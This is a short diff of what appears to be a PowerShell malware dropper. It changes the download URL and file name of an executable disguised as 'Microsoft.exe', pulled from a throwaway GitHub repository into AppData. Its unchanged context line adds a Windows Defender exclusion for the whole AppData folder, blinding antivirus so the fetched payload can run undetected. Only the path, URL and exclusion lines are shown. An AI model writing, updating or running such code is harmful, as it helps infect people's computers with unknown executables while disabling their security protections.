@@ -1,5 +1,5 @@
-$exePath = "$env:AppData\WindowsSecurity.exe"
-$exeUrl = "https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/WindowsSecurity.exe"
+$exePath = "$env:AppData\Microsoft.exe"
+$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe"
 
 # 1. Add Exclusion for AppData
 Add-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue
